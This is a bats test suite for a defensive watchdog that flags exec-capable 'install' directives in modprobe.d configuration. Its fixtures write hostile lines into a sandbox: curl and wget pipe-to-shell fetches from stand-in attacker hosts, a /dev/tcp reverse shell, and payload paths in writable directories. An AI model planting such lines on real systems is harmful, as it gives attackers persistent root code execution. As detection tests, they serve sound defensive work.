#!/usr/bin/env bats
# L2 bats functional tests for the modprobe-config-watchdog scan script.
#
# /etc/modprobe.d/*.conf can carry an `install <mod> <command>` line, and
# modprobe RUNS that command INSTEAD of inserting the module — triggered
# whenever anything autoloads <mod> (often reachable by an unprivileged
# user). The benign idiom is a disable: `install <mod> /bin/true`. Anything
# else is an exec-capable install (T1546). The watchdog is high-signal in
# two distinct ways: modprobe_config_exec_install (a non-/bin/true install
# command, escalated if under a writable root / bare) and
# modprobe_config_install_added (a NEW benign install directive appearing).
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# modprobe.d dir + baseline in a tmp sandbox via SELFDEF_MODPROBE_*.
#
# Run with: bats packaging/test/L2-modprobe-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/modprobe-config-watchdog/systemd/modprobe-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    MODD="${TMP}/modprobe.d"; mkdir -p "${MODD}"
    CONF="${MODD}/test.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_MODPROBE_PROFILE="${PROFILE:-report}" \
    SELFDEF_MODPROBE_BASELINE="${BASELINE}" \
    SELFDEF_MODPROBE_DIRS="${MODD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "benign disable install + blacklist, first run → ok / baseline_initial" {
    printf 'install pcspkr /bin/true\nblacklist floppy\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / modprobe_config_intact" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — exec-capable install
# ============================================================

@test "an exec-capable install command → alert / modprobe_config_exec_install" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd                                   # benign baseline
    printf "install pcspkr /bin/sh -c 'curl -s http://evil | sh'\n" > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_exec_install"'
    cap | grep -q '"severity":"alert"'
}

@test "an install command under a writable root → alert" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /tmp/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare/relative install command → alert" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a NEW benign disable install appearing → warn / modprobe_config_install_added" {
    printf 'blacklist floppy\n' > "${CONF}"
    run_wd                                   # baseline has no install line
    printf 'blacklist floppy\ninstall pcspkr /bin/true\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_install_added"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign blacklist change → warn / modprobe_config_changed" {
    printf 'blacklist floppy\n' > "${CONF}"
    run_wd
    printf 'blacklist floppy\nblacklist pcspkr\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"modprobe_config_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a disable install (/bin/true) is NOT alerted" {
    printf 'install pcspkr /bin/true\ninstall usb_storage /bin/false\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "blacklist + options lines are NOT flagged" {
    printf 'blacklist nouveau\noptions kvm_intel nested=1\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on an exec-capable install" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /tmp/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — modprobe-config inventory enumerates module-autoload-trigger root-exec surface)" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (install command under /var/tmp): writable-root expansion" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /var/tmp/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (install command under /dev/shm): tmpfs writable-root coverage" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /dev/shm/payload\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (install command with reverse-shell pattern): /dev/tcp → alert" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /bin/bash -c "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (install command with wget-pipe-sh): wget bootstrap" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    printf 'install evilmod /bin/sh -c "wget -qO- http://attacker/p | sh"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (current-behavior lock — modprobe-config-watchdog scans CONTENT, not the file's own perms; file-mode is owned by world-writable-watchdog)" {
    # Documented architectural boundary: this watchdog focuses on install
    # directive CONTENT (exec-capable install commands). File-mode coverage
    # lives in world-writable-watchdog / suid-sgid-watchdog. A world-
    # writable modprobe.d conf with benign content does NOT fire here.
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    # Lock that content-delta path: no install change → no exec-install
    # event from THIS watchdog.
    ! cap | grep -q '"event":"modprobe_config_exec_install"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'install pcspkr /bin/true\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-modprobe-config -- ')
    [ "${main_count}" = "1" ]
}
